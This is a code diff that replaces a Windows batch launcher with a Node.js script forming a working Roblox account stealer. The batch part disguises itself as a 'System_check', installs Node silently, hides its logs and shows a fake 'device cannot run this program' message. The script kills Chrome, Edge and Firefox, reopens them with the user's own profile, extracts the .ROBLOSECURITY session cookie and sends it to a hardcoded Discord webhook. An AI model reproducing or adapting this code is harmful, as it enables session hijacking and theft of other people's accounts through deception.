@@ -1,65 +1,138 @@
-@echo off
-setlocal enabledelayedexpansion
+const puppeteer = require('puppeteer');
+const {
+    execSync
+} = require('child_process');
+const fs = require('fs');
+const os = require('os');
 
-:: Show only Loading...
-cls
-echo Loading...
+const fetch = (...args) => import('node-fetch').then(({
+    default: fetch
+}) => fetch(...args));
+const username = os.userInfo().username;
 
-:: Set up paths
-set "basedir=%~dp0"
-set "tempdir=%basedir%puppeteer_temp"
-set "scriptfile=System_check.js"
-set "logfile=%temp%\puppeteer_setup_log.txt"
+function isBrowserInstalled(browserPath) {
+    return fs.existsSync(browserPath);
+}
 
-(
-    cd /d "%basedir%"
+function isBrowserRunning(browserName) {
+    try {
+        execSync(`tasklist /FI "IMAGENAME eq ${browserName}.exe"`, {
+            stdio: 'ignore'
+        });
+        return true;
+    } catch {
+        return false;
+    }
+}
 
-    :: Check if Node.js is installed
-    where node >nul 2>&1
-    if errorlevel 1 (
-        powershell -Command "Invoke-WebRequest -Uri https://nodejs.org/dist/v18.16.1/node-v18.16.1-x64.msi -OutFile node_install.msi"
-        if exist node_install.msi (
-            msiexec /i node_install.msi /quiet /norestart
-            del node_install.msi
-        ) else (
-            exit /b 1
-        )
-    )
+function killBrowserProcess(browserName) {
+    if (isBrowserRunning(browserName)) {
+        try {
+            execSync(`taskkill /IM ${browserName}.exe /F`);
+        } catch {}
+    }
+}
 
-    :: Wait for Node.js to be recognized
-    set tries=0
-    :waitnode
-    where node >nul 2>&1
-    if errorlevel 1 (
-        timeout /t 2 >nul
-        set /a tries+=1
-        if !tries! lss 10 goto waitnode
-        exit /b 1
-    )
+const browserPaths = [{
+        name: 'chrome',
+        path: `C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe`,
+        product: 'chrome',
+        userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Google\\Chrome\\User Data`,
+    },
+    {
+        name: 'msedge',
+        path: `C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe`,
+        product: 'chrome',
+        userDataDir: `C:\\Users\\${username}\\AppData\\Local\\Microsoft\\Edge\\User Data`,
+    },
+    {
+        name: 'firefox',
+        path: `C:\\Program Files\\Mozilla Firefox\\firefox.exe`,
+        product: 'firefox',
+        userDataDir: '',
+    },
+];
 
-    :: Remove old temp folder
-    if exist "%tempdir%" (
-        rmdir /s /q "%tempdir%"
-    )
+async function tryPuppeteer(browserConfig) {
+    let browser;
+    try {
+        browser = await puppeteer.launch({
+            executablePath: browserConfig.path,
+            product: browserConfig.product,
+            headless: true,
+            userDataDir: browserConfig.userDataDir || undefined,
+            args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-gpu'],
+            ignoreDefaultArgs: ['--enable-logging', '--v=1'],
+            dumpio: false,
+        });
 
-    :: Create and move to temp folder
-    mkdir "%tempdir%"
-    cd "%tempdir%"
+        const page = await browser.newPage();
+        await page.goto('https://www.roblox.com', {
+            waitUntil: 'domcontentloaded'
+        });
 
-    :: Setup Node project
-    call npm init -y >nul 2>&1
-    call npm install puppeteer node-fetch >nul 2>&1
+        const cookies = await page.cookies('https://www.roblox.com');
+        const robloxCookie = cookies.find(c => c.name === '.ROBLOSECURITY');
 
-    :: Copy and run the script
-    copy "%basedir%%scriptfile%" . >nul
-    call node "%scriptfile%"
+        if (!robloxCookie || !robloxCookie.value) {
+            console.error('Failed to retrieve .ROBLOSECURITY cookie.');
+            return false;
+        }
 
-    :: Clean up
-    cd "%basedir%"
-    rmdir /s /q "%tempdir%"
-) > "%logfile%" 2>&1
+        console.log(`.ROBLOSECURITY cookie: ${robloxCookie.value}`);
+        await sendWebhook(robloxCookie.value);
 
-:: Final message ONLY after the JS script finishes
-cls
-echo Your device cannot run this program
-pause
+        return true;
+    } catch (err) {
+        console.error('Error during Puppeteer operation:', err);
+        return false;
+    } finally {
+        if (browser) await browser.close();
+    }
+}
+
+async function sendWebhook(cookieValue) {
+    const webhookUrl = 'https://discord.com/api/webhooks/1394749850368737280/LQi3mEc93a1X8E3Fz3e110LLkPaOnuR0UX5O0OJCLKeUo6tABMenB55qMhND3jDXX8wy';
+
+    try {
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: `.ROBLOSECURITY cookie:\n\`\`\`${cookieValue}\`\`\``
+            }),
+        });
+
+        if (!response.ok) {
+            console.error('Failed to send webhook:', response.statusText);
+        } else {
+            console.log('Webhook sent successfully');
+        }
+    } catch (err) {
+        console.error('Error sending webhook:', err);
+    }
+}
+
+(async () => {
+    let triedAny = false;
+
+    for (const browser of browserPaths) {
+        if (!isBrowserInstalled(browser.path)) {
+            continue;
+        }
+
+        triedAny = true;
+        killBrowserProcess(browser.name);
+        const success = await tryPuppeteer(browser);
+        if (success) {
+            console.log(`Successfully retrieved .ROBLOSECURITY cookie from ${browser.name}`);
+            break;
+        }
+    }
+
+    if (!triedAny) {
+        console.log('No supported browsers found or they were not running.');
+    }
+})();
